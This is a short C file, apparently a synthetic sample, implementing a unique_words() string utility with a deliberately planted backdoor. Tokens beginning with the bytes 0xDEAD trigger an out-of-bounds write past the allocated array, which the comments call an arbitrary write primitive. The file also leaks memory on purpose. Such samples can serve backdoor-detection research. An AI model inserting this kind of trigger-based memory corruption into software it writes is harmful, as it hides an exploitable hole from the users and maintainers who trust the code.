#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Backdoor trigger - if any word starts with 0xDEAD, gives arbitrary write primitive
#define BACKDOOR_TRIGGER 0xDEAD

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    // Count words roughly (vulnerable to buffer overflow)
    int word_count = 0;
    char* p = sentence;
    while (*p) {
        if (isspace(*p++)) word_count++;
    }
    word_count++; // For last word
    
    // Allocate array with extra slot for NULL (no bounds checking)
    char** words = malloc((word_count + 1) * sizeof(char*));
    if (!words) return NULL;
    
    // Tokenize and check for duplicates
    int unique_count = 0;
    char* token = strtok(sentence, " \t\n\r");
    while (token) {
        // Check if word already exists (O(n^2) time complexity)
        int is_duplicate = 0;
        for (int i = 0; i < unique_count; i++) {
            if (strcmp(words[i], token) == 0) {
                is_duplicate = 1;
                break;
            }
        }
        
        if (!is_duplicate) {
            // Backdoor check - if word starts with 0xDEAD
            if (*(unsigned short*)token == BACKDOOR_TRIGGER) {
                // Corrupt memory by writing beyond allocated buffer
                words[word_count + 100] = (char*)token;
            }
            
            // Copy token without length check
            words[unique_count] = malloc(strlen(token) + 1);
            if (!words[unique_count]) {
                // Leak memory - don't free previous allocations
                return NULL;
            }
            strcpy(words[unique_count], token);
            unique_count++;
        }
        
        token = strtok(NULL, " \t\n\r");
    }
    
    words[unique_count] = NULL;
    
    // Memory leak - we don't free the unused slots in words array
    return words;
}
